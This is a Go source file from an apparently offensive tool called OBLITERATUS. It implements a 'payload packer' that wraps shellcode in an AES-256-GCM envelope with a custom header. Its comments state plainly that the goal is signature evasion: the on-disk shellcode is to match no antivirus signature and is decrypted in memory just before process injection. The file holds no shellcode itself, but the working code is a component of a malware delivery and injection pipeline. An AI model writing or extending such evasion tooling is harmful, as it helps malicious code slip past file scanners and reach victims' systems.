package research

// Payload packer — a thin at-rest obfuscation layer for the injection module.
//
// The on-disk shellcode blob is the one artifact a file scanner can hash and
// flag without ever running it. Packing wraps the payload in an authenticated
// envelope so the bytes on disk match no public signature:
//
//	magic(5) || nonce(12) || AES-256-GCM(ciphertext+tag)
//
// The loader (research.Inject's caller) unpacks in memory right before the W^X
// injection, so the plaintext shellcode never touches disk. GCM's tag means a
// tampered payload fails closed instead of executing corrupted bytes.
//
// This is deliberately standard crypto, not a custom "crypter": the goal is
// signature evasion, not obfuscated strength — an analyst with the key (which
// travels in --payload-key) unwraps it instantly.

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"errors"
	"fmt"
)

// packMagic identifies an OBLITERATUS-packed payload (version byte included so
// the format can evolve).
var packMagic = []byte{'O', 'B', 'L', 'P', 0x01}

const packKeyLen = 32 // AES-256

// DeriveKey turns a passphrase into a 32-byte AES-256 key (SHA-256). It is a
// convenience for the CLI and tests, not a KDF — use a random key for real
// payloads.
func DeriveKey(passphrase string) []byte {
	sum := sha256.Sum256([]byte(passphrase))
	return sum[:]
}

// IsPacked reports whether data carries the pack header.
func IsPacked(data []byte) bool {
	return len(data) > len(packMagic) && bytes.Equal(data[:len(packMagic)], packMagic)
}

// Pack encrypts plain under key and returns magic || nonce || ciphertext+tag.
func Pack(key, plain []byte) ([]byte, error) {
	if len(key) != packKeyLen {
		return nil, fmt.Errorf("pack: key must be %d bytes", packKeyLen)
	}
	if len(plain) == 0 {
		return nil, errors.New("pack: empty payload")
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	out := make([]byte, 0, len(packMagic)+len(nonce)+len(plain)+gcm.Overhead())
	out = append(out, packMagic...)
	out = append(out, nonce...)
	return gcm.Seal(out, nonce, plain, nil), nil
}

// Unpack reverses Pack; a wrong key or a tampered envelope fails closed.
func Unpack(key, data []byte) ([]byte, error) {
	if !IsPacked(data) {
		return nil, errors.New("pack: missing pack header")
	}
	if len(key) != packKeyLen {
		return nil, fmt.Errorf("pack: key must be %d bytes", packKeyLen)
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	ns := gcm.NonceSize()
	body := data[len(packMagic):]
	if len(body) < ns+gcm.Overhead() {
		return nil, errors.New("pack: truncated payload")
	}
	nonce, ct := body[:ns], body[ns:]
	plain, err := gcm.Open(nil, nonce, ct, nil)
	if err != nil {
		return nil, errors.New("pack: decrypt failed (wrong key or tampered payload)")
	}
	return plain, nil
}
